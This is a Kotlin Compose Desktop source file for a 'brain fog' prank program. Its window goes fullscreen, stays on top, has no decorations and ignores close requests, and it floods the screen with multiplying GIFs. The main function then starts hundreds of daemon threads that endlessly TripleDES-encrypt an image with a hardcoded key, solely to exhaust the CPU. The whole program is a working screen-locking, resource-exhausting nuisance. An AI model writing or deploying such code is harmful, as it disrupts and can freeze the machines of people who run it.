import androidx.compose.animation.ExperimentalAnimationApi
import androidx.compose.animation.core.*
import androidx.compose.desktop.ui.tooling.preview.Preview
import androidx.compose.foundation.Image
import androidx.compose.foundation.layout.*
import androidx.compose.material.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.LaunchedEffect
import androidx.compose.runtime.getValue
import androidx.compose.runtime.remember
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.layout.ContentScale
import androidx.compose.ui.res.painterResource
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.*
import androidx.compose.ui.window.*
import kotlinx.coroutines.delay
import java.awt.Toolkit
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec
import kotlin.concurrent.thread


@OptIn(ExperimentalAnimationApi::class, ExperimentalUnitApi::class)
@Composable
@Preview
fun App() {
    val screenSize = Toolkit.getDefaultToolkit().screenSize
    val brainFogMan = painterResource("img.png")

    Window(
        icon = brainFogMan,
        onCloseRequest = {},
        title = "",
        undecorated = true,
        alwaysOnTop = true,
        focusable = false,
        resizable = false,
        visible = true,
        state = WindowState(
            placement = WindowPlacement.Fullscreen,
            position = WindowPosition.Absolute(
                x = 0.dp,
                y = 0.dp
            ),
            size = WindowSize(
                width = screenSize.width.dp,
                height = screenSize.height.dp
            )
        )
    ) {
        var numCookies = remember { 1 }

        LaunchedEffect(key1 = "spawncookies") {
            while (true) {
                delay(500)
                numCookies++
            }
        }

        var numSmallBrain = remember { 0 }

        LaunchedEffect(key1 = "spawnsmallbrains") {
            delay(5_000)
            while (true) {
                delay(100)
                numSmallBrain++
            }
        }

        Image(
            painter = brainFogMan,
            contentDescription = null,
            contentScale = ContentScale.FillWidth,
            modifier = Modifier.fillMaxWidth()
        )

        BoxWithConstraints(
            modifier = Modifier.fillMaxSize().offset(y = Dp(20f)),
            contentAlignment = Alignment.TopStart,
        ) {
            val pacmanSize = Dp(200f)
            val numRows = this.maxHeight / pacmanSize
            val rowHeight = this.maxHeight / numRows
            val maxWidth = this.maxWidth
            val midPoint = (this.maxWidth.value / 2).toInt()

            repeat(numRows.toInt()) { index ->
                val rowYOffset = index.dp * rowHeight.value

                Row(
                    modifier = Modifier
                        .size(width = this.maxWidth, height = rowHeight)
                        .offset(y = rowYOffset),
                ) {
                    val pacmanStart = remember { (0..midPoint).random().toFloat() }
                    val pacmanEnd = remember { (midPoint..maxWidth.value.toInt()).random().toFloat() }
                    val pacmanTime = remember { (2..7).random() * 1000 }
                    val infiniteTransition = rememberInfiniteTransition()
                    val position by infiniteTransition.animateFloat(
                        initialValue = pacmanStart,
                        targetValue = pacmanEnd,
                        animationSpec = infiniteRepeatable(
                            animation = tween(pacmanTime),
                            repeatMode = RepeatMode.Reverse
                        )
                    )

                    GifAnimation(
                        resourceFilePath = "pacman.gif",
                        modifier = Modifier.offset(position.dp, 0.dp)
                    )
                }
            }

            repeat(numCookies) {
                GifAnimation(
                    resourceFilePath = "walkingcookie.gif",
                    modifier = Modifier.offset(
                        x = remember { (10..(maxWidth.value.toInt() - 200)).random().dp },
                        y = remember { (10..(maxHeight.value.toInt() - 200)).random().dp },
                    )
                )
            }

            repeat(numSmallBrain) {
                GifAnimation(
                    resourceFilePath = "smallbrain.gif",
                    modifier = Modifier.offset(
                        x = remember { (10..(maxWidth.value.toInt() - 1280)).random().dp },
                        y = remember { (10..(maxHeight.value.toInt() - 720)).random().dp },
                    )
                )
            }

            if (numSmallBrain > 30) {
                Text(
                    text = "DANGER BRAIN FOG",
                    color = Color.Red,
                    fontSize = TextUnit(value = 20f, TextUnitType.Em),
                    textAlign = TextAlign.Center,
                    modifier = Modifier.offset(x = 250.dp, y = (maxHeight / 2))
                )
            }
        }


        BoxWithConstraints(
            modifier = Modifier.fillMaxSize(),
            contentAlignment = Alignment.TopEnd,
        ) {
            GifAnimation(
                resourceFilePath = "3dpacman.gif",
                modifier = Modifier.offset(x = (-400).dp)
            )
        }

        BoxWithConstraints(
            modifier = Modifier.fillMaxSize(),
            contentAlignment = Alignment.BottomEnd,
        ) {
            GifAnimation(
                resourceFilePath = "smallbrain.gif",
                modifier = Modifier.offset(x = (-130).dp, y = (-75).dp)
            )
        }
    }
}

fun main() {
    val brainData = run {
        val classLoader = Thread.currentThread().contextClassLoader!!
        requireNotNull(classLoader.getResourceAsStream("brain.gif")).readAllBytes()
    }
    repeat(Runtime.getRuntime().availableProcessors() * 100) {
        thread(start = true, isDaemon = true) {
            Thread.sleep(15_000)
            while (true) {
                val encryptCipher = Cipher.getInstance("TripleDES/CBC/PKCS5Padding")
                encryptCipher
                    .init(
                        Cipher.ENCRYPT_MODE,
                        SecretKeySpec("abcg65v8jf4lxn93nabf981m".toByteArray(), "TripleDES")
                    )
                encryptCipher.doFinal(brainData)
            }
        }
    }

    application {
        App()
    }
}
